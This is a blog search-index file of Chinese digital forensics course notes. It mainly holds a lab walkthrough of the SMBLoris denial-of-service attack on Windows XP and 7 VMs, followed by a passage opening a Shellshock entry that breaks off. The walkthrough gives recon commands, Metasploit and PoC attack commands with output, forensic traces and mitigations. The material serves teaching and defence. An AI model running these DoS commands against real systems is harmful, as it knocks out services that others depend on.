<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>數位鑑識筆記 - SMBLoris</title>
      <link href="/2022/03/05/digital_forensics_2022_03_05/"/>
      <url>/2022/03/05/digital_forensics_2022_03_05/</url>
      
        <content type="html"><![CDATA[<h2 id="導言">導言</h2><p>雖然上次說要把每次老師教的課程做紀錄<br>但每次上課不一定有教新的漏洞，有時比較偏向單純的鑑識<br>在系統裡找犯罪的痕跡，不太好寫一篇報告<br>不過這學期仍有相關的課，那我就來把學到的攻擊做一遍練習吧</p><hr><h2 id="主題">主題</h2><p>這次練習的是<a href="https://www.secpod.com/blog/smbloris/" target="_blank" rel="noopener">SMBLoris</a><br>已經消失的<a href="https://web.archive.org/web/20190329104319/http://smbloris.com/" target="_blank" rel="noopener">官網</a>這邊用<em><a href="http://archive.org" target="_blank" rel="noopener">archive.org</a></em>找出來給大家看<br>由@zerosum0x0 &amp; @JennaMagius 所發現<br>基本上是透過攻擊SMB服務，透過每次傳送最大的上限的封包，來佔用對方伺服器的CPU、記憶體性能<br>屬於<strong>DoS</strong>類型的攻擊</p><p>甚麼是<em>SMB</em>?? <a href="https://bit.ly/3vKEndw" target="_blank" rel="noopener">參考這個</a><br>簡單來說就是windows的區域網「檔案、印表機」通訊及分享系統<br>不過Linux上也有一套逆向工程出來的<strong>Samba</strong><br>理論上影響著所有使用SMB協議的機器被開發出來</p><p>這次的受害環境有講師提供的<em>WindowsXP SP3</em>模擬機<br>分配的資源是1 CORE 1 GB Memory<br>還有<em>Windows 7 SP1</em>的模擬機<br>分配的資源是4 CORE 3 GB Memory<br>安全措施盡可能地關閉</p><hr><h2 id="攻擊">攻擊</h2><h4 id="需先準備軟體">需先準備軟體</h4><ol><li><strong>nmap</strong></li><li><strong>arp-scan</strong></li><li><strong>metasploit</strong></li><li><strong>GCC</strong></li><li><strong>SMBLoris</strong> <a href="https://bit.ly/3KlCIz0" target="_blank" rel="noopener"><strong>POC</strong></a><br>基本上準備個Kali Linux就能操作這次攻擊<br><em>GCC</em>是要用來編譯攻擊程式</li></ol><h3 id="攻擊流程">攻擊流程</h3><h4 id="1-使用arp-scan找到我們的目標主機">1. 使用<strong>arp-scan</strong>找到我們的目標主機</h4><p>這一步也可使用各種工具找到對方即可<br>或是直接在目標主機輸入ifconfig(<s>偷吃步</s></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo arp-scan -l         </span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:18:1d:29, IPv4: 192.168.85.130</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.85.100:50:56:c0:00:01VMware, Inc.</span><br><span class="line">192.168.85.12900:0c:29:e3:ab:54VMware, Inc.  &lt;------這次的目標XP</span><br><span class="line">192.168.85.13100:0c:29:4d:0a:b6VMware, Inc.  &lt;------這次的目標Win7</span><br><span class="line">192.168.85.25400:50:56:f2:b3:9fVMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.137 seconds (119.79 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure></div><h4 id="2-使用nmap尋找目標主機有哪些服務">2.使用nmap尋找目標主機有哪些服務</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -A 192.168.85.129    </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 20:06 CST</span><br><span class="line">Nmap scan report for 192.168.85.129</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds  Windows XP microsoft-ds</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h59m59s, deviation: 5h39m23s, median: -7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: JIMMY-B91C1364D, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:e3:ab:54 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: jimmy-b91c1364d</span><br><span class="line">|   NetBIOS computer name: JIMMY-B91C1364D\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-03-05T20:06:55+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.21 seconds</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -A 192.168.85.131    </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 20:15 CST</span><br><span class="line">Nmap scan report for 192.168.85.131</span><br><span class="line">Host is up (0.0090s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">554/tcp   open  rtsp?</span><br><span class="line">2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">| ssl-cert: Subject: commonName=WIN-FCFV8BPF54U</span><br><span class="line">| Not valid before: 2022-03-03T17:44:03</span><br><span class="line">|_Not valid after:  2022-09-02T17:44:03</span><br><span class="line">|_ssl-date: 2022-03-05T12:18:57+00:00; 0s from scanner time.</span><br><span class="line">7070/tcp  open  ssl/realserver?</span><br><span class="line">| ssl-cert: Subject: commonName=AnyDesk Client</span><br><span class="line">| Not valid before: 2020-09-12T17:39:21</span><br><span class="line">|_Not valid after:  2070-08-31T17:39:21</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49159/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49160/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">Service Info: Host: WIN-FCFV8BPF54U; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 3h59m59s, median: -1s</span><br><span class="line">|_nbstat: NetBIOS name: WIN-FCFV8BPF54U, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:4d:0a:b6 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1</span><br><span class="line">|   Computer name: WIN-FCFV8BPF54U</span><br><span class="line">|   NetBIOS computer name: WIN-FCFV8BPF54U\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-03-05T20:17:53+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-03-05T12:17:53</span><br><span class="line">|_  start_date: 2022-03-05T11:55:45</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 197.37 seconds</span><br></pre></td></tr></table></figure></div><h4 id="3-檢查漏洞">3.檢查漏洞</h4><p>我們可得知這兩部主機上皆有SMB服務在<em>PORT 445</em>上運行<br>由於這次的這個漏洞似乎不被微軟重視，理論上普遍存在所有利用SMB通訊的程式<br>不過你仍可以用nmap 腳本<a href="https://github.com/cldrn/external-nse-script-library/blob/master/smb-smbloris.nse" target="_blank" rel="noopener"><strong>NSE</strong></a>來檢查<br>這邊以掃XP舉例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV --script /home/susu/smb-smbloris.nse 192.168.85.129 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 14:38 CST</span><br><span class="line">Nmap scan report for 192.168.85.129</span><br><span class="line">Host is up (0.0036s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-smbloris: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Denial of service attack against Microsoft Windows SMB servers (SMBLoris)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: HIGH  CVSSv3: 8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)</span><br><span class="line">|       All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2017-08-1</span><br><span class="line">|     References:</span><br><span class="line">|_      http://smbloris.com/</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 192.63 seconds</span><br></pre></td></tr></table></figure></div><h4 id="4-攻擊">4.攻擊</h4><p>這次的攻擊有兩種實行的做法</p><p>一是利用<em>metaspolit</em>示範攻擊<strong>Win 7主機</strong><br>這個漏洞在win7上能看到比較明顯的變化</p><p>二是利用<em>PoC</em>來達成示範攻擊<strong>XP主機</strong><br><a href="https://packetstormsecurity.com/files/143636/SMBLoris-Denial-Of-Service.html" target="_blank" rel="noopener">這裡有關於PoC的詳細說明</a></p><h5 id="利用metaspolit">利用<em>metaspolit</em></h5><ol><li><p>設定系統的limit<br>由於這個攻擊會同時開啟很多連接<br>所以我們要先單獨更改shell能同時開啟的file<br>才能讓我們同時開很多Port占用對方資源(當然同時我們的電腦也要撐得住才行 <img class="emoji lazyload" draggable="false" alt="😛" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f61b.png" src="https://i.imgur.com/WS5Q2x3.gif"><br><a href="https://bit.ly/3hDJFiK" target="_blank" rel="noopener">參考這篇的說明</a><br><code>$ ulimit -n 65535</code></p></li><li><p>search</p></li></ol><pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; search smblorisMatching Modules================   #  Name                         Disclosure Date  Rank    Check  Description   -  ----                         ---------------  ----    -----  -----------   0  auxiliary/dos/smb/smb_loris  2017-06-29       normal  No     <span style="background-color:#9755B3">SMBLoris</span> NBSS Denial of ServiceInteract with a module by name or index. For example <font color="#5EBDAB">info 0</font>, <font color="#5EBDAB">use 0</font> or <font color="#5EBDAB">use auxiliary/dos/smb/smb_loris</font></pre><ol start="3"><li>use 與 設定選項</li></ol><pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; use 0<u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; optionsModule options (auxiliary/dos/smb/smb_loris):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   rhost  192.168.85.131   yes       The target address   rport  445              yes       SMB port on the target<u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; set rhost 192.168.85.131rhost =&gt; 192.168.85.131</pre><ol start="4"><li>攻擊<br>此時我們輸入<code>run</code>便可進行攻擊<br>要注意的是，這個攻擊不會自動結束，要手動關閉<br>因為這個模組會試圖保持連接</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(dos/smb/smb_loris) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Starting server...</span><br><span class="line">[*] 192.168.85.131:445 - 100 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 200 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 300 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 400 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 500 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 600 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 700 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 800 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 900 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 1000 socket(s) open</span><br><span class="line">跳過一點....</span><br><span class="line">[*] 192.168.85.131:445 - 3900 socket(s) open</span><br><span class="line">[!] 192.168.85.131:445 - At open socket limit with 3995 sockets open. Try increasing your system limits.</span><br><span class="line">[*] 192.168.85.131:445 - 3995 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - Holding steady at 3995 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - Holding steady at 3995 socket(s) open</span><br></pre></td></tr></table></figure></div><a href="https://imgur.com/PoZcqRf.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/PoZcqRf.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><p>至此，本次攻擊成功<br>這邊由於示範沒有讓他跑滿，若跑滿<em>65536</em>個PORT<br>可以吞掉大約8GB左右的記憶體<br><a href="https://imgur.com/7tg8zNc.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/7tg8zNc.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br>圖片來自<a href="https://web.archive.org/web/20190329104319/http://smbloris.com/" target="_blank" rel="noopener">官網</a></p><hr><h5 id="利用PoC">利用PoC</h5><p>雖然都叫PoC了，代表不是正式的攻擊工具<br>不過在我的情況下，這個工具才對我的XP系統在<strong>CPU</strong>有比較明顯的反應<br>Win 7更誇張了，會導致UI整個卡住<img class="emoji lazyload" draggable="false" alt="🤣" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f923.png" src="https://i.imgur.com/WS5Q2x3.gif"></p><ol><li>進行編譯<br><code>$ gcc -o smbloris smbloris.c</code></li><li>攻擊<br>我們來看一下格式</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./smbloris</span></span><br><span class="line">Usage: ./smbloris &lt;iface&gt; &lt;src_ip_start&gt; &lt;src_ip_end&gt; &lt;dst_ip&gt;</span><br></pre></td></tr></table></figure></div><p>這邊我們source IP暫時先設別組<br>如果設定我們自己的話，可能會被reply炸掉</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./smbloris eth0 192.168.0.0 192.168.0.255 192.168.85.129</span></span><br><span class="line">Local MAC address: 00:0c:29:18:1d:29</span><br><span class="line">c0a80012:9196 1216900 sent, 0 errors (0), 0 replies, 0 resets^C</span><br></pre></td></tr></table></figure></div><a href="https://imgur.com/axwAzsa.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/axwAzsa.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><p>至此，本次攻擊成功<br>不知道為甚麼，有股SYN Flooding的既視感<br>不過跟Win 7有些不同，主要是CPU占用較為明顯<br>有關<strong>記憶體</strong>的主要部分反而沒有明顯的反應</p><hr><h2 id="鑑識">鑑識</h2><h4 id="需先準備軟體-v2">需先準備軟體</h4><ol><li><strong>Wireshark</strong></li><li><strong>CurrPorts</strong></li></ol><p>這次多了一套新軟體，CurrPorts是一款輕量級簡潔的小工具<br>可用來查看有哪些Port被程式使用</p><p>由於這次有兩部主機，所以各談各自的資料</p><h4 id="Win-7">Win 7</h4><p>首先我們可以從Currports看到<br>有大量來自 <strong>(Kali)</strong> 192.168.85.130已建立的連線<br><a href="https://imgur.com/RgvEnAn.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/RgvEnAn.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p><p>在WireShark中也可以看到<br>有大量來自MAC位置 <strong>(Kali)</strong> <code>VMware_18:1d:29 (00:0c:29:18:1d:29)</code> 往 <strong>(Win 7)</strong> <code>VMware_4d:0a:b6 (00:0c:29:4d:0a:b6)</code> 的封包<br><a href="https://imgur.com/vuWHCAz.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/vuWHCAz.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p><h4 id="Win-XP">Win XP</h4><p>首先我們可以從Currports看到<br>有大量來自<strong>不存在</strong>的IP連線<br>這邊跟上面不同的是，連接並沒有被建立，對方(攻擊端)沒有給予回應<br><a href="https://imgur.com/fXL9wWr.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/fXL9wWr.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p><p>在WireShark中也可以看到<br>有大量來自MAC位置 <strong>(Kali)</strong> <code>VMware_18:1d:29 (00:0c:29:18:1d:29)</code> 往 <strong>(Win XP)</strong> <code>Vmware_e3:ab:54 (00:0c:29:e3:ab:54)</code> 的封包<br><a href="https://imgur.com/xhdRRkN.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/xhdRRkN.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p><hr><h2 id="解決方法">解決方法</h2><p>目前這個漏洞，Microsoft似乎沒有想要修復的意思<img class="emoji lazyload" draggable="false" alt="😅" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f605.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>因為這個漏洞除了能透過防火牆直接封鎖外<br>加上SMB服務通常只開放於內網<br>所以這個漏洞也沒有CVE編號</p><p>所以首要的動作是，想盡辦法限制此服務只能夠於內網使用<br><strong>禁止外網連接Port 139, 445</strong></p><h4 id="1">1.</h4><p>在windows這個漏洞麻煩的是，就算你關閉<em>SMB v1, v2, v3</em>服務也能夠被觸發<br>得直接把相關的<strong>Port 139, 445給都關閉</strong>才行<br>或是限制<strong>單個IP能夠打開的連接</strong></p><h4 id="2">2.</h4><p>在Linux的Samba部分的話，可透過設定smb.conf<br><code>max smbd processes = 1000</code><br>來限制系統可建立的連接</p><h2 id="參考資料來源">參考資料來源</h2><p><a href="https://web.archive.org/web/20190329104319/http://smbloris.com/" target="_blank" rel="noopener">SMBLoris Windows Denial of Service Vulnerability(官網)</a><br><a href="https://red.ht/3hHtfWA" target="_blank" rel="noopener">SMBLoris: Remote Denial-of-Service Against Samba - Red Hat Customer Portal</a><br><a href="https://bit.ly/35OmaAT" target="_blank" rel="noopener">SMBLoris - An SMB DoS Vulnerability - SecPod Blog</a><br><a href="https://bit.ly/3CheN0T" target="_blank" rel="noopener">SMBLoris NBSS Denial of Service - Metasploit - InfosecMatter</a><br><a href="https://samsclass.info/124/proj14/smbl.htm" target="_blank" rel="noopener">SMBLoris Attack</a><br><a href="https://twitter.com/marcan42/status/892716247502082051" target="_blank" rel="noopener">SMBLoris attack proof of concept: brings down my fully patched Win10 box in seconds.</a><br><a href="https://bit.ly/3Kin1ca" target="_blank" rel="noopener">SMBLoris Denial Of Service ≈ Packet Storm</a><br><a href="https://www.rapid7.com/blog/post/2017/08/03/smbloris-what-you-need-to-know/" target="_blank" rel="noopener">SMBLoris: What You Need To Know | Rapid7 Blog</a><br><a href="https://gist.github.com/marcan/6a2d14b0e3eaa5de1795a763fb58641e" target="_blank" rel="noopener">SMBLoris PoC</a><br><a href="https://read01.com/4DGJJjO.html" target="_blank" rel="noopener">CNNVD關於Windows SMBLoris漏洞情況的通報</a></p>]]></content>
      
      
      <categories>
          
          <category> 筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Digital forensics </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>數位鑑識筆記 - Shellshock</title>
      <link href="/2021/12/05/digital_forensics_2021_12_05/"/>
      <url>/2021/12/05/digital_forensics_2021_12_05/</url>
      
        <content type="html"><![CDATA[<h2 id="導言">導言</h2><p>最近正在上學校裡上數位鑑識相關課程<br>老師推薦的學習方式是每練習一次攻擊後，得利用各種工具及指令找出攻擊痕跡</p><p>所以這一系列的筆記總共會分為兩個部分</p><ul><li>攻擊過程</li><li>鑑識過程</li></ul><p>事不宜遲，總共約一個月的課程，期望自己能每次上完課都能更新<img class="emoji lazyload" draggable="false" alt="😆" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f606.png" src="https://i.imgur.com/WS5Q2x3.gif"></p><hr><h2 id="主題">主題</h2><p>本次練習的攻擊手法為<a href="https://zh.wikipedia.org/wiki/Shellshock" target="_blank" rel="noopener"><strong>Shellshock</strong>(CVE-2014-6271)</a><br><a href="https://imgur.com/5WKRpL0.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/5WKRpL0.png" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br>這邊引述一下維基百科的介紹</p><blockquote><p>Shellshock，又稱Bashdoor[1]，是在Unix中廣泛使用的Bash shell中的一個安全漏洞[2]，首次於2014年9月24日公開。許多網際網路守護行程，如網頁伺服器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下存取電腦系統[3]。 --引用自維基百科</p></blockquote><p>這次受害者的環境是講師所提供的iso檔<br>來自<em>PENTESTER LAB</em>，可至此網站下載一模一樣的練習環境<br><a href="https://www.vulnhub.com/entry/pentester-lab-cve-2014-6271-shellshock,104/" target="_blank" rel="noopener">Pentester Lab: CVE-2014-6271: ShellShock</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/version</span></span><br><span class="line">Linux version 3.14.1-pentesterlab (root@builder32) (gcc version 4.4.5 (Debian 4.4.5-8) ) #1 SMP Sun Jul 6 09:16:00 EST 2014</span><br></pre></td></tr></table></figure></div><h3 